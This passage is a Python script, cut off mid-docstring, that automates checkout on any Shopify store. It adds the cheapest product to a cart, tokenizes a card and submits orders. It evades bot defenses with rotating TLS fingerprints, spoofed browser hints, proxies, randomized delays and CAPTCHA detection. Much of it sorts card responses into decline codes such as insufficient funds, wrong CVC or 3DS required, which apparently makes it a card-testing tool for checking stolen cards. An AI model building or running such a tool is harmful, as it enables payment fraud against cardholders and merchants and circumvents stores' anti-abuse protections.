# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# Shopify Checkout API — Multi-Site Rewrite v3 (March 2026)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# Tested against allbirds.com, designed to work on ANY Shopify store.
# Uses latest Shopify Checkout Web API (unstable) with Negotiation paradigm.
#
# KEY FIXES vs v2:
#   - MerchandiseInput uses sourceProvidedMerchandise (NOT stableId or productVariantReference)
#   - DeliveryLineInput uses destination.streetAddress (NOT destinationAddress)
#   - DeliveryLineInput uses targetMerchandiseLines: {any: true}
#   - DeliveryLineInput uses deliveryStrategyByHandle: {handle, customDeliveryRate}
#   - DeliveryTermsInput noDeliveryRequired is REQUIRED (pass [] when shipping needed)
#   - DeliveryStreetAddressInput uses address1/zoneCode/postalCode (NOT addressLine1/provinceCode/zip)
#   - BuyerIdentityTermInput has NO deliveryAddress field (it's in DeliveryLineInput.destination)
#   - MerchandiseLineTargetCollectionInput uses {any: true} not {lines: [...]}
#   - Tax acceptance step added (TAX_NEW_TAX_MUST_BE_ACCEPTED)
#   - Payment is sent in a separate negotiate step (not bundled with merch+delivery)
#
# FLOW:
#   1. GET /products.json         → find cheapest physical product (variant_id, product_id, price, title)
#   2. GET homepage               → extract Storefront accessToken
#   3. POST /api/unstable/graphql → cartCreate mutation → checkoutUrl
#   4. GET checkoutUrl            → extract sessionToken, sourceToken, etc.
#   5. POST /checkouts/unstable/graphql → Negotiate (empty) → get queueToken + session state
#   6. POST /checkouts/unstable/graphql → Negotiate (buyerIdentity + merchandise + delivery)
#   7. Poll if delivery is PendingTerms
#   8. Re-negotiate to accept taxes (TAX_NEW_TAX_MUST_BE_ACCEPTED)
#   9. POST checkout.pci.shopifyinc.com/sessions → tokenize card
#  10. POST /checkouts/unstable/graphql → Negotiate (full payment proposal) → final totals
#  11. POST /checkouts/unstable/graphql → submitForCompletion → receipt
#  12. POST /checkouts/unstable/graphql → PollForReceipt → result
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

import asyncio
import base64
import json
import os
import re
import random
import sys
import time
import uuid
from urllib.parse import urlparse, quote

import tls_requests
from tls_requests import AsyncClient, TLSIdentifierRotator

# =====================================================================
# TLS FINGERPRINT ROTATION
# =====================================================================
_TLS_IDENTIFIER_POOL = [
    'chrome_131', 'chrome_133', 'chrome_120', 'chrome_124',
    'chrome_117', 'chrome_112', 'chrome_111', 'chrome_110',
]
_tls_rotator = TLSIdentifierRotator(items=_TLS_IDENTIFIER_POOL, strategy='random')

# =====================================================================
# CLIENT HINTS MAP (matched to each TLS identifier)
# =====================================================================
_CLIENT_HINTS_MAP = {
    'chrome_131': {
        'ua': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
        'ver': '131', 'full_ver': '131.0.0.0',
        'sec_ch_ua': '"Google Chrome";v="131", "Chromium";v="131", "Not/A)Brand";v="24"',
        'sec_ch_ua_full': '"Google Chrome";v="131.0.0.0", "Chromium";v="131.0.0.0", "Not/A)Brand";v="24.0.0.0"',
        'platform': '"Windows"',
    },
    'chrome_133': {
        'ua': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36',
        'ver': '133', 'full_ver': '133.0.0.0',
        'sec_ch_ua': '"Google Chrome";v="133", "Chromium";v="133", "Not/A)Brand";v="24"',
        'sec_ch_ua_full': '"Google Chrome";v="133.0.0.0", "Chromium";v="133.0.0.0", "Not/A)Brand";v="24.0.0.0"',
        'platform': '"Windows"',
    },
    'chrome_120': {
        'ua': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'ver': '120', 'full_ver': '120.0.0.0',
        'sec_ch_ua': '"Google Chrome";v="120", "Chromium";v="120", "Not_A Brand";v="8"',
        'sec_ch_ua_full': '"Google Chrome";v="120.0.0.0", "Chromium";v="120.0.0.0", "Not_A Brand";v="8.0.0.0"',
        'platform': '"Windows"',
    },
    'chrome_124': {
        'ua': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
        'ver': '124', 'full_ver': '124.0.0.0',
        'sec_ch_ua': '"Google Chrome";v="124", "Chromium";v="124", "Not_A Brand";v="8"',
        'sec_ch_ua_full': '"Google Chrome";v="124.0.0.0", "Chromium";v="124.0.0.0", "Not_A Brand";v="8.0.0.0"',
        'platform': '"Windows"',
    },
    'chrome_117': {
        'ua': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
        'ver': '117', 'full_ver': '117.0.0.0',
        'sec_ch_ua': '"Google Chrome";v="117", "Chromium";v="117", "Not)A;Brand";v="8"',
        'sec_ch_ua_full': '"Google Chrome";v="117.0.0.0", "Chromium";v="117.0.0.0", "Not)A;Brand";v="8.0.0.0"',
        'platform': '"Windows"',
    },
    'chrome_112': {
        'ua': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36',
        'ver': '112', 'full_ver': '112.0.0.0',
        'sec_ch_ua': '"Google Chrome";v="112", "Chromium";v="112", "Not:A-Brand";v="24"',
        'sec_ch_ua_full': '"Google Chrome";v="112.0.0.0", "Chromium";v="112.0.0.0", "Not:A-Brand";v="24.0.0.0"',
        'platform': '"Windows"',
    },
    'chrome_111': {
        'ua': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
        'ver': '111', 'full_ver': '111.0.0.0',
        'sec_ch_ua': '"Google Chrome";v="111", "Chromium";v="111", "Not(A)Brand";v="8"',
        'sec_ch_ua_full': '"Google Chrome";v="111.0.0.0", "Chromium";v="111.0.0.0", "Not(A)Brand";v="8.0.0.0"',
        'platform': '"Windows"',
    },
    'chrome_110': {
        'ua': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
        'ver': '110', 'full_ver': '110.0.0.0',
        'sec_ch_ua': '"Google Chrome";v="110", "Chromium";v="110", "Not A)Brand";v="24"',
        'sec_ch_ua_full': '"Google Chrome";v="110.0.0.0", "Chromium";v="110.0.0.0", "Not A)Brand";v="24.0.0.0"',
        'platform': '"Windows"',
    },
}


def _pick_identifier():
    return _tls_rotator.next()


def _get_client_hints(identifier):
    return _CLIENT_HINTS_MAP.get(identifier) or _CLIENT_HINTS_MAP['chrome_133']


# =====================================================================
# PROXY HANDLING
# =====================================================================
def parse_proxy(proxy_str):
    """Normalize proxy string to URL format."""
    if not proxy_str:
        return None
    proxy_str = proxy_str.strip()
    if proxy_str.startswith('http://') or proxy_str.startswith('https://') or proxy_str.startswith('socks'):
        return proxy_str
    if '@' in proxy_str:
        return f'http://{proxy_str}'
    parts = proxy_str.split(':')
    if len(parts) == 4:
        host, port, user, pwd = parts
        return f'http://{user}:{pwd}@{host}:{port}'
    elif len(parts) == 2:
        return f'http://{proxy_str}'
    return proxy_str


def _init_proxy(proxy_str=None):
    if not proxy_str:
        return None
    return parse_proxy(proxy_str)


# =====================================================================
# DELAY & RETRY UTILITIES
# =====================================================================
DELAY_SCALE = float(os.environ.get('DELAY_SCALE', '0.25'))


async def human_delay(min_sec=0.8, max_sec=2.5, step_name=""):
    if DELAY_SCALE <= 0:
        return
    scaled_min = min_sec * DELAY_SCALE
    scaled_max = max_sec * DELAY_SCALE
    delay = random.triangular(scaled_min, scaled_max, (scaled_min + scaled_max) / 2.5)
    if random.random() < 0.05:
        delay += random.uniform(0.3, 1.0) * DELAY_SCALE
    await asyncio.sleep(delay)


async def retry_on_429(request_func, step_name="request", max_retries=3, base_delay=3.0, max_delay=15.0):
    was_retried = False
    for attempt in range(max_retries + 1):
        response = await request_func()
        if response.status_code != 429:
            return response, was_retried
        if attempt == max_retries:
            return response, was_retried
        backoff = min(base_delay * (2 ** attempt), max_delay)
        jitter = random.uniform(0.5, 1.5)
        delay = backoff * jitter
        print(f"[rate-limit] {step_name} got HTTP 429, retry {attempt+1}/{max_retries} in {delay:.1f}s", file=sys.stderr)
        await asyncio.sleep(delay)
        was_retried = True
    return response, was_retried


# =====================================================================
# STRING / HTML EXTRACTION HELPERS
# =====================================================================
def extract_between(text, start, end):
    """Extract substring between start and end markers."""
    if not text:
        return ''
    idx = text.find(start)
    if idx == -1:
        return ''
    idx += len(start)
    end_idx = text.find(end, idx)
    if end_idx == -1:
        return ''
    return text[idx:end_idx]



def extract_storefront_token(text: str) -> str:
    """Extract Shopify Storefront API access token from page HTML.
    
    Supports 4 patterns:
    1. Classic: {"accessToken":"TOKEN",...}
    2. Hydrogen/Oxygen: "PUBLIC_STOREFRONT_API_TOKEN","TOKEN"
    3. window.Shopify: Shopify.storefrontAccessToken = "TOKEN"
    4. Legacy meta: <meta name="shopify-storefront-api-token" content="TOKEN">
    """
    if not text:
        return ''
    # Pattern 1: JSON object with accessToken key (classic themes)
    tok = extract_between(text, '"accessToken":"', '"')
    if tok and len(tok) >= 16:
        return tok
    # Pattern 2: Hydrogen/Oxygen stores: "PUBLIC_STOREFRONT_API_TOKEN","TOKEN"
    m = re.search(r'"PUBLIC_STOREFRONT_API_TOKEN"\s*[,\s"]+([a-f0-9]{32})', text)
    if m:
        return m.group(1)
    # Pattern 2b: escaped: \"PUBLIC_STOREFRONT_API_TOKEN\",\"TOKEN\"
    m = re.search(r'PUBLIC_STOREFRONT_API_TOKEN[^a-f0-9]*([a-f0-9]{32})', text)
    if m:
        return m.group(1)
    # Pattern 3: window.Shopify object
    m = re.search(r"[\"']?storefrontAccessToken[\"']?\s*[=:]\s*[\"']([^\"']{16,})[\"']", text)
    if m:
        return m.group(1)
    # Pattern 4: meta tag
    m = re.search(r'<meta[^>]+name=[\"\']shopify-storefront-api-token[\"\'][^>]+content=[\"\']([^\"\']+)[\"\']', text, re.I)
    if m:
        return m.group(1)
    # Pattern 5: accessToken in various quote styles
    tok = (extract_between(text, "accessToken':'", "'")
           or extract_between(text, 'accessToken\":\"', '\\'))
    return tok or ''


def extract_meta_content(html, name):
    """Extract content from <meta name="serialized-*"> tags."""
    patterns = [
        f'<meta name="{name}" content="',
        f'<meta name=\'{name}\' content=\'',
        f'<meta content="\' name="{name}">',
    ]
    for pattern in patterns:
        val = extract_between(html, pattern, '"')
        if val:
            val = val.replace('&amp;', '&').replace('&quot;', '"').replace('&#39;', "'").replace('&lt;', '<').replace('&gt;', '>')
            return val
    return ''


# =====================================================================
# GRAPHQL QUERY/MUTATION CONSTANTS
# =====================================================================
# These queries are based on the ACTUAL Shopify Checkout Web API schema
# as introspected from allbirds.com in March 2026.
#
# KEY SCHEMA CHANGES vs older versions:
#   - MerchandiseInput is a UNION: productVariantReference | sourceProvidedMerchandise | giftCardMerchandise
#   - sourceProvidedMerchandise is REQUIRED for checkout sessions (productVariantReference.id is INVALID)
#   - DeliveryLineInput.destination contains the address (NOT BuyerIdentityTermInput.deliveryAddress)
#   - DeliveryStreetAddressInput uses address1/zoneCode/postalCode
#   - DeliveryStrategyInput uses deliveryStrategyByHandle: {handle, customDeliveryRate}
#   - MerchandiseLineTargetCollectionInput uses {any: true}
#   - DeliveryTermsInput.noDeliveryRequired is REQUIRED NON_NULL (pass [] when shipping needed)

# --- Storefront API: cartCreate ---
# IMPORTANT: We request the variant ID back from the cart so we can use the
# *server-confirmed* GID in sourceProvidedMerchandise. The REST API numeric ID
# and the Storefront API GID usually resolve to the same gid:// URI, but we
# should never assume that — always use the ID the server returned.
MUTATION_CART_CREATE = """mutation cartCreate($input:CartInput!){result:cartCreate(input:$input){cart{id checkoutUrl cost{subtotalAmount{amount currencyCode}totalAmount{amount currencyCode}totalTaxAmount{amount currencyCode}totalDutyAmount{amount currencyCode}}lines(first:10){edges{node{quantity merchandise{...on ProductVariant{requiresShipping}}}}}}errors:userErrors{message field code}}}"""

# --- Checkout Web API: Proposal (Negotiate from Session) ---
# Updated to match the CORRECT schema from GraphQL introspection.
# Key changes:
#   - Added __typename on sellerProposal, buyerProposal, delivery, merchandise, payment
#   - Added merchandise{__typename} inside merchandiseLines for debugging
#   - Removed tax sub-fields (tax comes from sellerProposal.totalAmount or via TAX_NEW_TAX_MUST_BE_ACCEPTED)
#   - Uses the exact format confirmed working on allbirds.com
#
# IMPORTANT (linesV2 stableId fix):
#   `linesV2` returns a UNION type `MerchandiseLineType`. GraphQL forbids
#   field selections directly on a union — only `__typename` and inline
#   fragments (`...on MemberType{...}`) are allowed. The previous query
#   used `linesV2{__typename stableId}` which Shopify rejected with:
#     "Selections can't be made directly on unions (see selections on MerchandiseLineType)"
#     extensions.code = "selectionMismatch", extensions.nodeName = "MerchandiseLineType"
#   The fix wraps `stableId` inside `...on MerchandiseLine{stableId}` —
#   MerchandiseLine is the union member returned by Shopify (confirmed
#   via the `__typename` field in real responses).
QUERY_PROPOSAL = """
query Proposal($input:SessionNegotiationInput!){session{negotiate(input:$input){errors{code localizedMessage}result{__typename ...on NegotiationResultAvailable{queueToken sessionToken sellerProposal{__typename checkoutTotal{__typename ...on MoneyValueConstraint{value{amount currencyCode}}...on AnyConstraint{any:_singleInstance}...on MoneyIntervalConstraint{lowerBound{amount currencyCode}upperBound{amount currencyCode}}}isShippingRequired delivery{__typename ...on PendingTerms{pollDelay taskId}...on FilledDeliveryTerms{deliveryLines{__typename deliveryMethodTypes stableId selectedDeliveryStrategy{__typename ...on CompleteDeliveryStrategy{handle code title amount{__typename ...on MoneyValueConstraint{value{amount currencyCode}}...on AnyConstraint{any:_singleInstance}}}...on CustomDeliveryStrategy{code title price{__typename ...on MoneyValueConstraint{value{amount currencyCode}}}}...on DeliveryStrategyReference{handle}}totalAmount{__typename ...on MoneyValueConstraint{value{amount currencyCode}}...on AnyConstraint{any:_singleInstance}}destinationAddress{__typename ...on StreetAddress{address1 address2 city countryCode zoneCode postalCode}...on PartialStreetAddress{address1 city countryCode zoneCode postalCode}}targetMerchandise{__typename ...on AnyMerchandiseLineTargetCollection{any}...on FilledMerchandiseLineTargetCollection{linesV2{__typename ...on MerchandiseLine{stableId}}}}}}...on UnavailableTerms{__typename}}merchandise{__typename ...on FilledMerchandiseTerms{merchandiseLines{stableId merchandise{__typename ...on ProductVariantMerchandise{variantId title digest product{title id}}...on ContextualizedProductVariantMerchandise{variantId title digest price{amount currencyCode}product{title id}}...on SourceProvidedMerchandise{variantId title digest price{amount currencyCode}requiresShipping taxable giftCard}}}}}payment{__typename ...on FilledPaymentTerms{availablePaymentLines{paymentMethod{__typename ...on PaymentProvider{paymentMethodIdentifier name brands}}}}}}buyerProposal{__typename checkoutTotal{__typename ...on MoneyValueConstraint{value{amount currencyCode}}...on AnyConstraint{any:_singleInstance}}}}...on NegotiationResultFailed{failureCode}...on SubmittedForCompletion{receipt{__typename ...on ProcessingReceipt{id __typename}...on ProcessedReceipt{id order{id __typename}}...on FailedReceipt{id processingError{__typename}}...on ActionRequiredReceipt{id __typename}...on WaitingReceipt{id __typename}}}...on CheckpointDenied{__typename}...on Throttled{__typename}...on TooManyRequests{__typename}}}}}
"""

# --- Checkout Web API: SubmitForCompletion ---
# CRITICAL: submitForCompletion returns SubmitForCompletionResult UNION directly
# (NOT a payload with errors/result wrapper like negotiate).
# Union members: SubmitSuccess, SubmittedForCompletion, SubmitFailed,
#   SubmitRejected, CheckpointDenied, Throttled, TooManyAttempts,
#   TooManyRequests, SubmitAlreadyAccepted
# SubmitSuccess/SubmittedForCompletion have: receipt (Receipt union), configurationRecordId
# SubmitFailed has: reason (String)
# SubmitRejected has: errors, buyerProposal, sellerProposal
MUTATION_SUBMIT = (
    "mutation SubmitForCompletion($input:NegotiationInput!$attemptToken:String!)"
    "{submitForCompletion(input:$input attemptToken:$attemptToken)"
    "{__typename"
    "...on SubmitSuccess{receipt{__typename"
    "...on ProcessingReceipt{id pollDelay __typename}"
    "...on ProcessedReceipt{id order{id __typename} orderStatusPageUrl}"
    "...on FailedReceipt{id processingError{__typename ...on PaymentFailed{code messageUntranslated hasOffsitePaymentMethod __typename}...on InventoryClaimFailure{__typename}}}"
    "...on ActionRequiredReceipt{id __typename}"
    "...on WaitingReceipt{id pollDelay __typename}"
    "}configurationRecordId}"
    "...on SubmittedForCompletion{receipt{__typename"
    "...on ProcessingReceipt{id pollDelay __typename}"
    "...on ProcessedReceipt{id order{id __typename} orderStatusPageUrl}"
    "...on FailedReceipt{id processingError{__typename ...on PaymentFailed{code messageUntranslated hasOffsitePaymentMethod __typename}...on InventoryClaimFailure{__typename}}}"
    "...on ActionRequiredReceipt{id __typename}"
    "...on WaitingReceipt{id pollDelay __typename}"
    "}configurationRecordId}"
    "...on SubmitFailed{reason}"
    "...on SubmitRejected{__typename errors{code localizedMessage}sellerProposal{__typename checkoutTotal{__typename ...on MoneyValueConstraint{value{amount currencyCode}}...on AnyConstraint{any:_singleInstance}}delivery{__typename ...on FilledDeliveryTerms{deliveryLines{__typename deliveryMethodTypes stableId selectedDeliveryStrategy{__typename ...on CompleteDeliveryStrategy{handle code title amount{__typename ...on MoneyValueConstraint{value{amount currencyCode}}...on AnyConstraint{any:_singleInstance}}}...on CustomDeliveryStrategy{code title price{__typename ...on MoneyValueConstraint{value{amount currencyCode}}}}...on DeliveryStrategyReference{handle}}totalAmount{__typename ...on MoneyValueConstraint{value{amount currencyCode}}...on AnyConstraint{any:_singleInstance}}destinationAddress{__typename ...on StreetAddress{address1 address2 city countryCode zoneCode postalCode}}targetMerchandise{__typename ...on AnyMerchandiseLineTargetCollection{any}...on FilledMerchandiseLineTargetCollection{linesV2{__typename ...on MerchandiseLine{stableId}}}}}}}}}"
    "...on CheckpointDenied{redirectUrl __typename}"
    "...on Throttled{pollAfter queueToken __typename}"
    "...on TooManyAttempts{__typename}"
    "...on TooManyRequests{retryAfter __typename}"
    "...on SubmitAlreadyAccepted{receipt{__typename ...on ProcessingReceipt{id __typename}...on ProcessedReceipt{id order{id __typename} orderStatusPageUrl}...on FailedReceipt{id processingError{__typename ...on PaymentFailed{code messageUntranslated hasOffsitePaymentMethod __typename}...on InventoryClaimFailure{__typename}}}...on ActionRequiredReceipt{id __typename}...on WaitingReceipt{id __typename}}__typename}}"
    "}"
)

# --- Checkout Web API: PollForReceipt ---
# Receipt union: ActionRequiredReceipt, FailedReceipt, ProcessedReceipt,
# ProcessingReceipt, ProcessingRemoteCheckoutsReceipt, ReceiptNotFound, WaitingReceipt
# NOTE: No SuccessfulReceipt! Use ProcessedReceipt instead.
# Poll via node(id:) — query the receipt directly by its GID.
# The old receipt(id:) was wrong (doesn't accept 'id' arg).
# The negotiate approach starts a new negotiation instead of polling.
# node(id:ID!) is standard Shopify GraphQL for fetching any node by GID.
QUERY_POLL = """query PollForReceipt{receipt{__typename ...on ProcessingReceipt{id pollDelay __typename}...on ProcessedReceipt{id order{id __typename} orderStatusPageUrl}...on FailedReceipt{id processingError{__typename ...on PaymentFailed{code messageUntranslated hasOffsitePaymentMethod __typename}...on InventoryClaimFailure{__typename}}}...on ActionRequiredReceipt{id __typename}...on WaitingReceipt{id pollDelay __typename}...on ProcessingRemoteCheckoutsReceipt{id __typename}...on ReceiptNotFound{__typename}}}"""


# =====================================================================
# CAPTCHA DETECTION
# =====================================================================
_CAPTCHA_INDICATORS = [
    'hcaptcha', 'recaptcha',
    'cf-challenge', 'cloudflare',
    'CAPTCHA_METADATA_MISSING',
]


def is_captcha_required(response_text):
    """Check if the response indicates an actual CAPTCHA challenge.
    
    NOTE: We do NOT check for 'checkpoint' or 'CheckpointDenied' here because
    those appear in our GraphQL query as valid type names. Instead, we check
    for the actual CAPTCHA challenge indicators in the response DATA.
    """
    if not response_text:
        return False
    lower = response_text.lower()
    # Only match 'checkpoint' if it's in the actual error data, not the query structure
    if 'checkpoint' in lower:
        # Check if it's a CheckpointDenied result in the response data
        if '"__typename":"CheckpointDenied"' in response_text:
            return True
        if 'CHECKPOINT_BLOCKED' in response_text:
            return True
    return any(ind in lower for ind in _CAPTCHA_INDICATORS)


# =====================================================================
# ERROR EXTRACTION
# =====================================================================
_GENERIC_PAYMENT_CODES = {'GENERIC_ERROR', 'PAYMENT_FAILED', ''}

# Gateway detection mapping from payment method names/typeNames
_GATEWAY_MAP = {
    'shopify_payments': 'shopify_payments',
    'stripe': 'stripe',
    'braintree': 'braintree',
    'authorize_net': 'authorize_net',
    'authorize.net': 'authorize_net',
    'paypal': 'paypal',
    'cybersource': 'cybersource',
    'worldpay': 'worldpay',
    'adyen': 'adyen',
    'checkout_com': 'checkout_com',
    'first_data': 'first_data',
    'global_payments': 'global_payments',
    'sage_pay': 'sage_pay',
    'payflow': 'payflow',
    'payeezy': 'payeezy',
    'moneris': 'moneris',
    'mollie': 'mollie',
    'bogus': 'bogus',
    # Type name patterns
    'DirectPaymentMethod': 'shopify_payments',
    'CreditCardPaymentMethod': 'shopify_payments',
}


def _detect_gateway_from_payment(pm_name, pm_typename=''):
    """Detect gateway name from payment method name and typename.
    
    Returns the canonical gateway name, or None if not detected.
    """
    if not pm_name and not pm_typename:
        return None
    
    # Check payment method name against known gateways
    name_lower = (pm_name or '').lower().strip()
    for key, gw in _GATEWAY_MAP.items():
        if key in name_lower:
            return gw
    
    # Check typename
    type_lower = (pm_typename or '').lower().strip()
    for key, gw in _GATEWAY_MAP.items():
        if key in type_lower:
            return gw
    
    # If we have a name but no match, return the name itself as gateway
    if name_lower and name_lower not in ('shop_pay', 'apple_pay', 'google_pay', 
                                          'paypal_express', 'shopify_installments',
                                          'wallet', 'gift_card', 'offsite'):
        return name_lower
    
    return None


def _is_generic_payment_code(value):
    return str(value or '').strip().upper() in _GENERIC_PAYMENT_CODES


def _first_non_empty_string(*values):
    for value in values:
        if value is None:
            continue
        text = str(value).strip()
        if text:
            return text
    return ''


def _extract_payment_error_response(error, _depth=0):
    """Extract the most specific payment error from nested Shopify response."""
    if _depth > 5:
        return 'UNKNOWN_PAYMENT_ERROR'
    if not isinstance(error, dict):
        return 'UNKNOWN_PAYMENT_ERROR'

    generic_code = ''
    candidate_keys = (
        'declineCode', 'decline_code', 'gatewayCode', 'gateway_code',
        'processorCode', 'processor_code', 'networkResponseCode',
        'network_response_code', 'reasonCode', 'reason_code',
        'errorCode', 'error_code', 'code',
    )
    for key in candidate_keys:
        value = _first_non_empty_string(error.get(key))
        if value and not _is_generic_payment_code(value):
            return value
        if value and _is_generic_payment_code(value) and not generic_code:
            generic_code = value

    nested_containers = (
        error.get('message'), error.get('paymentError'), error.get('gatewayResponse'),
        error.get('networkResponse'), error.get('processorResponse'), error.get('details'),
    )
    for nested in nested_containers:
        if isinstance(nested, dict):
            nested_code = nested.get('code')
            if isinstance(nested_code, str) and nested_code.strip() and not _is_generic_payment_code(nested_code):
                return nested_code.strip()
            nested_response = _extract_payment_error_response(nested, _depth=_depth + 1)
            if nested_response != 'UNKNOWN_PAYMENT_ERROR' and not _is_generic_payment_code(nested_response):
                return nested_response
            if _is_generic_payment_code(nested_response) and not generic_code:
                generic_code = nested_response

    _message_val = error.get('message')
    message = _first_non_empty_string(
        error.get('localizedMessage'), error.get('nonLocalizedMessage'),
        error.get('messageUntranslated'),
        _message_val if not isinstance(_message_val, dict) else None,
        error.get('description'), error.get('reason'), error.get('detail'),
    )
    if message and not _is_generic_payment_code(message):
        return message

    return generic_code or message or 'UNKNOWN_PAYMENT_ERROR'


def _payment_requires_offsite_action(error):
    """Return True if the payment error indicates an off-site redirect / 3DS challenge.

    Shopify's PurchaseOrderProcessingError carries two boolean flags:
        - hasOffsiteRedirect       (older / Stripe-style 3DS redirect)
        - hasOffsitePaymentMethod  (newer wallet / off-site payment methods)

    Either being truthy means the cardholder must complete authentication
    off-site (3DS, OTP, wallet approval, etc.) — the payment has NOT been
    declined, so we report "3DS_REQUIRED" rather than "CARD_DECLINED".
    """
    if not isinstance(error, dict):
        return False
    return bool(error.get('hasOffsiteRedirect') or error.get('hasOffsitePaymentMethod'))


def extract_clean_response(message):
    if not message:
        return "UNKNOWN_ERROR"
    message = str(message)
    message = re.sub(r'<[^>]+>', '', message).strip()
    if not message:
        return "UNKNOWN_ERROR"

    DIAGNOSTIC_PREFIXES = [
        'PROPOSAL_BLOCKED:', 'PROPOSAL_EMPTY:', 'PROPOSAL_JSON_ERROR:',
        'SUBMIT_BLOCKED:', 'SUBMIT_JSON_ERROR:', 'PCI_VAULT_BLOCKED:',
        'PCI_VAULT_ERROR:', 'BLOCKED:', 'POLL_BLOCKED:', 'POLL_JSON_ERROR:',
        'POLL_EMPTY:', 'SESSION_TOKEN_MISSING:', 'CHECKOUT_PAGE_FAILED:',
        'DELIVERY_PENDING_TIMEOUT:', 'NO_SHIPPING_STRATEGY:',
        'INVENTORY_CLAIM_FAILURE:', 'RECEIPT_NOT_FOUND:',
    ]
    for prefix in DIAGNOSTIC_PREFIXES:
        if message.startswith(prefix):
            return message[:120]

    _KNOWN_CODES = {
        'CARD_DECLINED', 'INSUFFICIENT_FUNDS', 'EXPIRED_CARD', 'INVALID_CVC',
        'INCORRECT_NUMBER', 'INCORRECT_CVC', 'INCORRECT_ZIP', 'INCORRECT_ADDRESS',
        'PROCESSING_ERROR', 'CALL_ISSUER', 'PICK_UP_CARD', 'DO_NOT_HONOR',
        'CARD_NOT_SUPPORTED', 'TRY_AGAIN_LATER', 'INVALID_ACCOUNT',
        'INVALID_AMOUNT', 'INVALID_NUMBER', 'ALREADY_REFUNDED',
        'AUTHENTICATION_REQUIRED', 'TEST_MODE_LIVE_CARD',
        '3DS_REQUIRED', 'OTP_REQUIRED', 'ORDER_PLACED',
        'INVENTORY_CLAIM_FAILURE', 'RECEIPT_NOT_FOUND',
        'CAPTCHA_REQUIRED', 'GENERIC_ERROR', 'PAYMENT_FAILED',
        'PAYMENTS_UNACCEPTABLE_PAYMENT_AMOUNT', 'TAX_MISMATCH',
        'TAX_NEW_TAX_MUST_BE_ACCEPTED', 'DESTINATION_ADDRESS_REQUIRED',
        'DELIVERY_DELIVERY_LINE_DETAIL_CHANGED', 'MERCHANDISE_SIGNATURE_MISMATCH',
    }
    msg_upper = message.strip().upper()
    if msg_upper in _KNOWN_CODES:
        return message.strip()

    patterns = [
        r'(PAYMENTS_[A-Z_]+)', r'(CARD_[A-Z_]+)',
        r'([A-Z]+_[A-Z]+_[A-Z_]+)', r'([A-Z]+_[A-Z_]+)',
        r'code["\']?\s*[:=]\s*["\']?([^"\',]+)["\']?',
    ]
    for pattern in patterns:
        matches = re.findall(pattern, message, re.IGNORECASE)
        for match in matches:
            if isinstance(match, tuple):
                match = match[0]
            if match and "_" in match and len(match) < 50:
                match = match.strip("{}:'\" ")
                if match.upper() not in _GENERIC_PAYMENT_CODES:
                    return match

    words = message.split()
    if words:
        first_word = words[0]
        if "_" in first_word and first_word.isupper():
            if not _is_generic_payment_code(first_word) or len(words) <= 1:
                return first_word

    return message[:120]


# =====================================================================
# HELPER: Deep dict get with fallback
# =====================================================================
def _dget(data, *keys, default=None):
    """Deep dict get — traverse nested dict by keys."""
    current = data
    for key in keys:
        if isinstance(current, dict):
            current = current.get(key)
        elif isinstance(current, list) and isinstance(key, int) and key < len(current):
            current = current[key]
        else:
            return default
        if current is None:
            return default
    return current


# =====================================================================
# HELPER: Extract amount from MoneyConstraint union
# =====================================================================
def _calc_tax(checkout_total_str, price_str, currency='USD'):
    """Calculate tax from checkout total - price. Returns string amount."""
    try:
        ct = float(checkout_total_str) if checkout_total_str else 0
        p = float(price_str) if price_str else 0
        # Tax = checkout_total - price - shipping_estimate
        # Since we don't know exact shipping, estimate tax as (checkout_total - price) * 0.7
        # (shipping typically ~30% of the difference)
        diff = ct - p
        if diff > 0:
            tax = round(diff * 0.7, 2)
            return f'{tax:.2f}'
        return '0.00'
    except (ValueError, TypeError):
        return '0.00'


def _extract_money(constraint_obj):
    """Extract amount and currencyCode from a MoneyConstraint or Money union.
    
    Handles both formats:
    - MoneyValueConstraint: {value: {amount: "5.0", currencyCode: "USD"}}
    - Money: {amount: "5.0", currencyCode: "USD"}
    """
    if not constraint_obj or not isinstance(constraint_obj, dict):
        return '0', 'USD'
    
    # Try MoneyValueConstraint path
    value = constraint_obj.get('value')
    if isinstance(value, dict):
        return str(value.get('amount', '0')), str(value.get('currencyCode', 'USD'))
    
    # Try direct Money path
    if 'amount' in constraint_obj:
        return str(constraint_obj['amount']), str(constraint_obj.get('currencyCode', 'USD'))
    
    # Try AnyConstraint (no specific value)
    if constraint_obj.get('__typename') == 'AnyConstraint':
        return '0', 'USD'
    
    return '0', 'USD'


# =====================================================================
# HELPER: Build sourceProvidedMerchandise for MerchandiseInput
# =====================================================================
def _build_source_provided_merchandise(variant_id, product_id, price, currency, title, requires_shipping, digest=None):
    """Build a sourceProvidedMerchandise dict for MerchandiseInput.
    
    This is the ONLY valid MerchandiseInput type for checkout sessions.
    productVariantReference.id is INVALID — it causes SUBMIT_JSON_ERROR.
    
    IMPORTANT: The variant_id and product_id MUST match the server's internal IDs.
    Use the IDs extracted from the cart response (Storefront API) or from the
    seller proposal, NOT the REST API IDs. The REST API numeric IDs usually
    match the gid:// format, but this is not guaranteed for all stores.
    
    digest: When provided, include the server-confirmed merchandise digest.
